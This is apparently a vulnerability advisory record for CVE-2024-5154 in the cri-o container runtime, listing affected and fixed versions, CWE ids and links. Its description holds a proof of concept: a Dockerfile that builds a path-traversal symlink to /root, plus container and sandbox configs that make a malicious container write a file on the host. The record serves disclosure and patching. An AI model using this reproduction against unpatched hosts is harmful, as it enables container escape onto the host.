---
identifier: "CVE-2024-5154"
identifiers:
- "CVE-2024-5154"
- "GHSA-j9hf-98c3-wrm8"
package_slug: "go/github.com/cri-o/cri-o"
title: "malicious container creates symlink \"mtab\" on the host External"
description: "A malicious container can affect the host by taking advantage of code
  cri-o added to show the container mounts on the host.\n\nA workload built from this
  Dockerfile:\n```\nFROM docker.io/library/busybox as source\nRUN mkdir /extra &&
  cd /extra && ln -s ../../../../../../../../root etc\n\nFROM scratch\n\nCOPY --from=source
  /bin /bin\nCOPY --from=source /lib /lib\nCOPY --from=source /extra .\n\n```\n\nand
  this container config:\n\n```\n{\n\"metadata\": {\n\"name\": \"busybox\"\n},\n\"image\":{\n\"image\":
  \"localhost/test\"\n},\n\"command\": [\n\"/bin/true\"\n],\n\"linux\": {\n}\n}\n\n\n```\nand
  this sandbox config\n```\n{\n\"metadata\": {\n\"name\": \"test-sandbox\",\n\"namespace\":
  \"default\",\n\"attempt\": 1,\n\"uid\": \"edishd83djaideaduwk28bcsb\"\n},\n\"linux\":
  {\n\"security_context\": {\n\"namespace_options\": {\n\"network\": 2\n}\n}\n}\n}\n\n```\n\nwill
  create a file on host `/host/mtab`"
date: "2024-06-04"
pubdate: "2024-06-04"
affected_range: ">=1.30.0 <1.30.1||=1.30.0||>=1.29.4 <1.29.5||=1.29.4||>=1.28.6 <1.28.7||=1.28.6"
fixed_versions:
- "1.30.1"
- "1.29.5"
- "1.28.7"
affected_versions: "All versions starting from 1.28.6 before 1.28.7, version 1.28.6,
  all versions starting from 1.29.4 before 1.29.5, version 1.29.4, all versions starting
  from 1.30.0 before 1.30.1, version 1.30.0"
not_impacted: ""
solution: "Upgrade to versions 1.28.7, 1.29.5, 1.30.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2024-5154"
- "https://github.com/advisories/GHSA-j9hf-98c3-wrm8"
- "https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8"
- "https://github.com/cri-o/cri-o"
uuid: "17bdbe5c-3d60-4011-bd0a-560e9c5d25c3"
cwe_ids:
- "CWE-22"
- "CWE-937"
- "CWE-1035"
